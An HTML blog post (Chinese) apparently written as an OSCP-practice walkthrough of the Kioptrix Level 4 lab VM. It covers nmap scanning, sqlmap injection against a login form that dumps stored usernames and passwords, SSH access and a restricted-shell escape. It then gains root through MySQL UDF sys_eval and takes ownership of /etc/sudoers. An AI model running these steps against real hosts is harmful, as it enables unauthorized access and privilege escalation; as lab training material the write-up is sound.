@@ -1,0 +1,202 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"><title>0x04 - Kioptrix Level 4 受限 Shell 越狱 + Mysql UDF 提权 | JChan</title><meta name="author" content="JChan-L"><meta name="copyright" content="JChan-L"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="0x04 - Kioptrix Level 4 受限 Shell 越狱 + Mysql UDF 提权"><meta property="og:type" content="article"><meta property="og:title" content="0x04 - Kioptrix Level 4 受限 Shell 越狱 + Mysql UDF 提权"><meta property="og:url" content="https://jchan-l.github.io/584e.html"><meta property="og:site_name" content="JChan"><meta property="og:description" content="0x04 - Kioptrix Level 4 受限 Shell 越狱 + Mysql UDF 提权"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://jchan-l.github.io/img/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.png"><meta property="article:published_time" content="2023-12-31T09:20:49.000Z"><meta property="article:modified_time" content="2023-12-31T09:21:26.223Z"><meta property="article:author" content="JChan-L"><meta property="article:tag" content="OSCP靶场"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://jchan-l.github.io/img/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://jchan-l.github.io/584e.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><meta name="google-site-verification" content="iN3DXj29opWtjO7xGs-o26OdQ9x030yATNANf4SvA7E"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload='this.media="all"'><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":300},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"0x04 - Kioptrix Level 4 受限 Shell 越狱 + Mysql UDF 提权",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2023-12-31 17:21:26"}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const now = new Date()
+          const hour = now.getHours()
+          const isNight = hour <= 6 || hour >= 22
+          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+          else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror='onerror=null,src="/img/friend_404.gif"' alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image:url(/img/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.png)"><nav id="nav"><span id="blog-info"><a href="/" title="JChan"><span class="site-name">JChan</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i> <span>搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>Categories</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">0x04 - Kioptrix Level 4 受限 Shell 越狱 + Mysql UDF 提权</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-31T09:20:49.000Z" title="发表于 2023-12-31 17:20:49">2023-12-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-31T09:21:26.223Z" title="更新于 2023-12-31 17:21:26">2023-12-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/oscp/">oscp</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="扫描主机"><a href="#扫描主机" class="headerlink" title="扫描主机"></a>扫描主机</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 探测主机</span></span><br><span class="line">nmap -sn -r 192.168.1.1/24 --min-rate 5555</span><br><span class="line"></span><br><span class="line">nmap -A 192.168.1.130 -oA nmap-result</span><br><span class="line"></span><br><span class="line">-A：启动Os检测，版本检测，脚本扫描和traceroute</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)      </span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   1024 9bad4ff21ec5f23914b9d3a00be84171 (DSA)</span><br><span class="line">|_  2048 8540c6d541260534adf86ef2a76b4f0e (RSA)</span><br><span class="line">80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).   </span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)</span><br><span class="line"></span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.33</span><br><span class="line"></span><br><span class="line">Host script results:     </span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line">|_clock-skew: mean: 10h30m02s, deviation: 3h32m07s, median: 8h00m02s</span><br><span class="line">|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)</span><br><span class="line">| smb-security-mode:                           </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb-os-discovery:                            </span><br><span class="line">|   OS: Unix (Samba 3.0.28a)</span><br><span class="line">|   Computer name: Kioptrix4</span><br><span class="line">|   NetBIOS computer name: </span><br><span class="line">|   Domain name: localdomain</span><br><span class="line">|   FQDN: Kioptrix4.localdomain</span><br><span class="line">|_  System time: 2023-12-31T09:45:21-05:00</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux-ng 192.168.1.130</span><br></pre></td></tr></table></figure><p><img src="/0x04%20-%20Kioptrix%20Level%204%20%E5%8F%97%E9%99%90%20Shell%20%E8%B6%8A%E7%8B%B1%20+%20Mysql%20UDF%20%E6%8F%90%E6%9D%83231231.png"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p><img src="/0x04%20-%20Kioptrix%20Level%204%20%E5%8F%97%E9%99%90%20Shell%20%E8%B6%8A%E7%8B%B1%20+%20Mysql%20UDF%20%E6%8F%90%E6%9D%83231231-1.png"></p><h5 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h5><p>使用 burpsuite 抓取请求包，写入123，然后使用sqlmap进行sql注入</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /checklogin.php HTTP/1.1</span><br><span class="line">Host: 192.168.1.130</span><br><span class="line">Content-Length: 44</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.1.130</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.102 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.1.130/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">myusername=admin&amp;mypassword=123&amp;Submit=Login 123</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r 123 --level 3 --batch</span><br><span class="line"></span><br><span class="line">sqlmap identified the following injection point(s) with a total of 1428 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: mypassword (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    </span><br><span class="line">    Type: time-based blind</span><br><span class="line">---</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r 123 --level 3 --batch -D members -T members --dump -C <span class="string">&quot;username,password&quot;</span></span><br><span class="line"></span><br><span class="line">Database: members</span><br><span class="line">Table: members</span><br><span class="line">[2 entries]</span><br><span class="line">+----------+-----------------------+</span><br><span class="line">| username | password              |</span><br><span class="line">+----------+-----------------------+</span><br><span class="line">| robert   | ADGAdsafdfwt4gadfga== |</span><br><span class="line">| john     | MyNameIsJohn          |</span><br><span class="line">+----------+-----------------------+</span><br></pre></td></tr></table></figure><h1 id="受限Shell越狱"><a href="#受限Shell越狱" class="headerlink" title="受限Shell越狱"></a>受限Shell越狱</h1><p>尝试使用SSH连接</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh john@192.168.1.130 -oHostKeyAlgorithms=+ssh-dss</span><br></pre></td></tr></table></figure><p><img src="/0x04%20-%20Kioptrix%20Level%204%20%E5%8F%97%E9%99%90%20Shell%20%E8%B6%8A%E7%8B%B1%20+%20Mysql%20UDF%20%E6%8F%90%E6%9D%83231231-3.png"></p><p>linux受限，只能使用指定的命令</p><p><img src="/0x04%20-%20Kioptrix%20Level%204%20%E5%8F%97%E9%99%90%20Shell%20%E8%B6%8A%E7%8B%B1%20+%20Mysql%20UDF%20%E6%8F%90%E6%9D%83231231-4.png"></p><p><img src="/0x04%20-%20Kioptrix%20Level%204%20%E5%8F%97%E9%99%90%20Shell%20%E8%B6%8A%E7%8B%B1%20+%20Mysql%20UDF%20%E6%8F%90%E6%9D%83231231-5.png"><br>成功出狱</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>尝试<code>sudo -l</code>提权，列出目前的权限。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john@Kioptrix4:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> john: </span><br><span class="line">Sorry, user john may not run sudo on Kioptrix4.</span><br></pre></td></tr></table></figure><p>查看具有suid权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>可使用这个网站进行查看相关suid的利用</p><blockquote><p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a></p></blockquote><h5 id="尝试mysql提权"><a href="#尝试mysql提权" class="headerlink" title="尝试mysql提权"></a>尝试mysql提权</h5><p><img src="/0x04%20-%20Kioptrix%20Level%204%20%E5%8F%97%E9%99%90%20Shell%20%E8%B6%8A%E7%8B%B1%20+%20Mysql%20UDF%20%E6%8F%90%E6%9D%83231231-6.png"></p><p>mysql 免密码登录</p><p>查看是否存在<code>mysql udf</code>函数</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john@Kioptrix4:~$ whereis lib_mysqludf_sys.so</span><br><span class="line">lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so</span><br></pre></td></tr></table></figure><p>创建函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create function sys_eval returns string soname &#x27;lib_mysqludf_sys.so&#x27;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select sys_eval(&#x27;whoami&#x27;);</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line">| sys_eval(&#x27;whoami&#x27;) |</span><br><span class="line">+--------------------+</span><br><span class="line">| root</span><br><span class="line">              | </span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>成功执行命令</p><p>将<code>/etc/sudoers</code>的所有者和用户组，修改为john用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sys_eval(&#x27;chown -R john:john /etc/sudoers&#x27;);</span><br></pre></td></tr></table></figure><p>并给 写 的权限，修改完文件后，保存退出，将权限恢复原来的权限</p><p><img src="/0x04%20-%20Kioptrix%20Level%204%20%E5%8F%97%E9%99%90%20Shell%20%E8%B6%8A%E7%8B%B1%20+%20Mysql%20UDF%20%E6%8F%90%E6%9D%83231231-7.png"></p><p><img src="/0x04%20-%20Kioptrix%20Level%204%20%E5%8F%97%E9%99%90%20Shell%20%E8%B6%8A%E7%8B%B1%20+%20Mysql%20UDF%20%E6%8F%90%E6%9D%83231231-8.png"></p><p><img src="/0x04%20-%20Kioptrix%20Level%204%20%E5%8F%97%E9%99%90%20Shell%20%E8%B6%8A%E7%8B%B1%20+%20Mysql%20UDF%20%E6%8F%90%E6%9D%83231231-9.png"></p></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者:</span> <span class="post-copyright-info"><a href="https://jchan-l.github.io">JChan-L</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接:</span> <span class="post-copyright-info"><a href="https://jchan-l.github.io/584e.html">https://jchan-l.github.io/584e.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明:</span> <span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://jchan-l.github.io" target="_blank">JChan</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/OSCP%E9%9D%B6%E5%9C%BA/">OSCP靶场</a></div><div class="post_share"><div class="social-share" data-image="/img/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.png" target="_blank"><img class="post-qr-code-img" src="/img/wechat.png" alt="wechat"></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.png" target="_blank"><img class="post-qr-code-img" src="/img/alipay.png" alt="alipay"></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/eb32.html" title="0x03 - Kioptrix Level 3 SQL 注入 + sudo 提权"><img class="cover" src="/img/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-17</div><div class="title">0x03 - Kioptrix Level 3 SQL 注入 + sudo 提权</div></div></a></div><div><a href="/bb69.html" title="0x02 - Kioptrix Level 2 简单的命令注入 + 内核提权"><img class="cover" src="/img/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-17</div><div class="title">0x02 - Kioptrix Level 2 简单的命令注入 + 内核提权</div></div></a></div><div><a href="/c241.html" title="0x01 - Kioptrix Level 1 古老的 Apache Vuln"><img class="cover" src="/img/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-17</div><div class="title">0x01 - Kioptrix Level 1 古老的 Apache Vuln</div></div></a></div></div></div><hr class="custom-hr"><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i> <span>评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror='this.onerror=null,this.src="/img/friend_404.gif"' alt="avatar"></div><div class="author-info__name">JChan-L</div><div class="author-info__description">这是一个宝藏Blog</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/JChan-L"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="/JChan_L" target="_blank" title="WeChat"><i class="fab fa-weixin" style="color:#4a7dbe"></i></a><a class="social-icon" href="/2075661906" target="_blank" title="QQ"><i class="fab fa-qq" style="color:#4a7dbe"></i></a><a class="social-icon" href="mailto:jchan-l@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color:#4a7dbe"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到JChan的博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E4%B8%BB%E6%9C%BA"><span class="toc-number">1.</span> <span class="toc-text">扫描主机</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SQLMAP"><span class="toc-number">2.0.0.0.1.</span> <span class="toc-text">SQLMAP</span></a></li></ol></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%97%E9%99%90Shell%E8%B6%8A%E7%8B%B1"><span class="toc-number">3.</span> <span class="toc-text">受限Shell越狱</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95mysql%E6%8F%90%E6%9D%83"><span class="toc-number">4.0.0.0.1.</span> <span class="toc-text">尝试mysql提权</span></a></li></ol></li></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/584e.html" title="0x04 - Kioptrix Level 4 受限 Shell 越狱 + Mysql UDF 提权">0x04 - Kioptrix Level 4 受限 Shell 越狱 + Mysql UDF 提权</a><time datetime="2023-12-31T09:20:49.000Z" title="发表于 2023-12-31 17:20:49">2023-12-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/eb32.html" title="0x03 - Kioptrix Level 3 SQL 注入 + sudo 提权">0x03 - Kioptrix Level 3 SQL 注入 + sudo 提权</a><time datetime="2023-12-17T02:54:43.000Z" title="发表于 2023-12-17 10:54:43">2023-12-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/bb69.html" title="0x02 - Kioptrix Level 2 简单的命令注入 + 内核提权">0x02 - Kioptrix Level 2 简单的命令注入 + 内核提权</a><time datetime="2023-12-17T02:54:13.000Z" title="发表于 2023-12-17 10:54:13">2023-12-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/c241.html" title="0x01 - Kioptrix Level 1 古老的 Apache Vuln">0x01 - Kioptrix Level 1 古老的 Apache Vuln</a><time datetime="2023-12-17T02:50:53.000Z" title="发表于 2023-12-17 10:50:53">2023-12-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/38cd.html" title="数据通信">数据通信</a><time datetime="2023-10-30T09:34:23.000Z" title="发表于 2023-10-30 17:34:23">2023-10-30</time></div></div></div></div></div></div></main><footer id="footer" style="background-image:url(/img/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.png)"><div id="footer-wrap"><div class="copyright">&copy;2023 By JChan-L</div><div class="footer_custom_text">I wish you to become your own sun, no need to rely on who's light.</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://jchan-api.vercel.app/',
+      region: '',
+      onCommentLoaded: () => {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') setTimeout(init,0)
+    else getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(init)
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://jchan-api.vercel.app/',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else {
+      loadTwikoo()
+      
+    }
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zindex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful=!0,POWERMODE.shake=!0,POWERMODE.mobile=!1,document.body.addEventListener("input",POWERMODE)</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="mar,is,pig" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i> <span>数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
